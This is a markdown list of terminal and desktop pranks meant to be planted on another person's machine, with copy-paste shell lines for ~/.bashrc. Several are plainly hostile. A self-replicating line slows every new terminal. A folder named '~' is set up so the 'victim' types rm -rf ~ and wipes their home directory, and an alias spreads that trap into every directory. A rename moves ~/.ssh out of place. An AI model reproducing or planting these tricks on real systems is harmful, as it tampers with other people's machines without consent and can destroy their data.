## 1. Slow down the terminal

![](./img/whitepng/1.png) 
<!-- ![](./img/3.png) -->

```
echo "echo 'sleep .1' >> ~/.bashrc" >> ~/.bashrc
```

So a `sleep .1` is added to `~/.bashrc` everytime the user starts a new terminal. So the terminal startup time increases with every use, slowly, but surely.

## 2. Create a `~` folder
**Note**: Potentially destructive. Use caution.
<!-- ![mkdir '~' && echo "kghkjhlkjh" > ./'~'/1](./img/2.1.png) -->
![](./img/whitepng/2.1.png) 

```
mkdir '~'
echo "kghkjhlkjh" > ./'~'/1
```
While `~` is an alias for `$HOME` folder, file/folder names with `~` are perfectly legal. Put some random stuff in it so that user has to use `rm -rf ` to delete the folder.

Now, invariably, the victim types `rm -rf ~` to delete the folder. :smiling_imp:

If you want to be sure the user notices it, add this line to `~/.bashrc`.  

<!-- ![](./img/2.2.png) -->
![](./img/whitepng/2.2.png) 

```
alias cd="mkdir -p '~' && echo "kghkjhlkjh" > ./'~'/1 && cd"
```
Now every directory the user `cd`s into will have a `~` folder.

## 3. Change ssh to shh
<!-- ![mv ~/.ssh ~/.shh](./img/1.png) -->
![](./img/whitepng/3.png) 
```
mv ~/.ssh ~/.shh
```

## 4. File names that end with spaces

![](./img/whitepng/4.png) 
<!-- ![](./img/4.png) -->

```
mv ~/.ssh ~/'.ssh '
```
```
mkdir ~/Desktop/'hello '
```
And so on.

File names with trailing spaces are perfectly legal. Watch them struggle deleting it :laughing:

## 5. Ssshhh! - macOS only

In `settings > accessibility > Speech > System voice > customise`, download voice `whisper`.  

Now, add this to `~/.bashprofile`

![](./img/whitepng/5.png)  
<!-- ![](./img/5.png)   -->

```
alias ssh="osascript -e 'set volume 10' && say -v whisper shh && ssh"
```

## 6. Upside down Windows

Every one knows that `ctrl + shift + down-arrow` inverts the desktop. Instead, 

* Take a screenshot of the normal Desktop, invert it horizontally and vertically in paint. 
* Then disable icons and auto hide the taskbar.
* Set the previous inverted image as Wallpaper.
* optional: Invert mouse and arrow keys from settings
* Now invert the Desktop!

## 7. Change Editors!

Modify the `.bashrc` to include this:  

![](./img/whitepng/7.png)  

```
alias nano="/usr/bin/vi"
alias vi="/usr/bin/nano"
alias vim="/usr/bin/emacs"
alias emacs="/usr/bin/vim"
```

## 8. Install sl

Install sl and leave it be. Everyone is bound to type `sl` instead of `ls` at some point of time.

## 9. Make `date` return random dates

This might need some tweaking in some systems, especially BSD versions of `date` command.  Add these to `.bashrc`.

![](./img/whitepng/9.1.png)  

``` sh
 alias date='date -d "now + $RANDOM days"'
```

Similarly, for the `cal` command,

![](./img/whitepng/9.2.png)  

``` sh
function cal() {
    if [ $# -eq 0 ]; then # If no arguments
        /usr/bin/cal -m $(date +%b) $(( ((RANDOM<<15)|RANDOM) % 45 + 2000 ));
    else
        /usr/bin/cal $(( ((RANDOM<<15)|RANDOM) % 45 + 2000 ));
    fi;
}
```

![cal](./img/cal.png)
